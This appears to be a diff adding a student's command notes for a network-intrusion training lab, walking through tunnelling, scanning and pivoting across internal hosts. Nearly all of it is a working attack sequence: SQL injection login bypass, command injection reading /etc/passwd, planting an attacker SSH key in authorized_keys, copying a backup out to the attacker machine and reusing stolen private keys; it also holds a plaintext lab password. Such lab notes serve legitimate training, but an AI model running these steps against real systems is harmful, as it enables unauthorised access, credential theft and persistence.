@@ -1,0 +1,104 @@
+ssh -MS /tmp/jump student@10.50.30.19
+	password 
+4Id49EHR9h39y8V
+for i in {1..254}; do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+ssh -S /tmp/jump JUMP -O forward -D 9050
+proxychains nmap -Pn -T4 192.168.28.100 --open
+proxychains nc 192.168.28.100 80
+proxychains nc 192.168.28.100 2222
+ssh -S /tmp/jump JUMP -O forward -L 12001:192.168.28.100:80 -L 12002:192.168.28.100:2222
+proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.28.100 -p 80
+firefox 127.0.0.1:12001
+http://127.0.0.1:12001/admin
+http://127.0.0.1:12001/admin/login.php
+‘ OR 1=’1
+' OR 1='1
+	autolaunched
+http://127.0.0.1:12001/admin/admin.php
+; whoami
+; cat /etc/passwd
+right click view page source- users, user home folders, login shells
+; cat /etc/hosts
+righ click view page source- next hop host, resolve name to ip
+; cat /etc/passwd
+right click view page source- encrypted passwords to john
+__________________________________________________________________________________
+SSH KEY UPLOAD	
+	use loginshell from the /etc/passwd for interactive shell check
+	file id_rsa (private key)
+	file id_rsa.pub (public key)
+* Generate and ssh key on LinOps
+
+ 	 	ssh-keygen -t rsa -b 4096
+		cat ~/.ssh/id_rsa.pub
+		
+* Inject public key into website
+* Make .ssh folder in home directory
+
+		;ls -la /users/home/directory      #check if .ssh exists
+		; mkdir /users/home/directory/.ssh   #make .ssh in users home folder if it does not exist
+
+* Make authorized key file in .ssh
+* If file already exists, use >>
+* If there isn't one, > will make a new file. 
+
+; echo "Your_Public_key" > /users/home/directory/.ssh/authorized_keys
+**** type the quotation marks directly into the webpage to avoid errors do not an copy and paste that portion**** if errors continue ; rm /users/home/directory/.ssh/authorized_keys and repeat the steps to upload the key*****
+
+* Verify key has been uploaded successfully.
+
+		 ; cat /users/home/directory/.ssh/authorized_keys
+
+* ssh onto the box:
+
+   		ssh user@<ip>  OR ssh victimUsername@127.0.0.1:<tunnel port number that points to victim ip>
+		
+*** test the connection by ssh to the box***
+  ***Shouldn't prompt for password. If it does, you did it wrong. Regenerate and upload again***
+
+* Authenticating with a private key that was found:
+(to use a specific private key, replace 'id_rsa' with whatever you saved it as)
+
+  		ssh -i user_rsa.priv user@ip
+				ORth
+	ssh  -i id_rsa user@127.0.0.1 -p <tunnel port number>
+___________________________________________________________________________________
+ssh -MS /tmp/T100 www-data@127.0.0.1 -p 12002
+ip a
+ip n
+ss -ntlp
+for i in {1..254}; do (ping -c 1 192.168.150.$i | grep "bytes from" &) ;done
+cd /tmp
+ls -la
+scp backup.tar.gz student@10.50.30.90:  
+	*** sends to the student home folder on linops
+	
+
+___________________________________________________________________________________
+
+ssh -S /tmp/jump JUMP -O cancel -D 9050
+ssh -S /tmp/T100 T100 -O forward -D 9050
+proxychains nmap -Pn -T4 192.168.150.253 --open
+proxychains nmap -v -sT -Pn -T4 --script=http-enum.nse 192.168.150.253 -p 80
+proxychains nmap -v -sT -Pn -T4 --script=banner.nse 192.168.150.253 -p 1-5000
+*** double check the port range to ensure it is not default scanning the top 1024***
+*** manually input to double check if all ports are under 1000 that return using -- open***
+ssh -S /tmp/T100 T100 -O forward -L 12011:192.168.150.253:80 -L 12012:192.168.150.253:514 -L 12013:192.168.150.253:3201
+
+___________________________________________________________________________________
+http://127.0.0.1:12011  < Default webpage-nothing configured here move on>
+proxychains nmap -v -sT -Pn -T4 --script=banner.nse 192.168.150.253 -p 3201
+
+*** on LinOps
+	ls -la
+	mkdir stolenkeys
+	mv backup.tar.gz stolenkeys
+	cd stolenkeys/
+	ls -la
+	tar -zxvf backup.tar.gz
+	***from the relative directory on LinOps~/stolenkeys$
+	***test the ssh connection with the private key
+	ssh -i .ssh/id_rsa comrade@127.0.0.1 -p 12013 
+	***Lands on comrade@lin ->  now create its master socket
+___________________________________________________________________________________
+ssh -MS /tmp/T253 -i stolenkeys/.ssh/id_rsa comrade@127.0.0.1 -p 12013
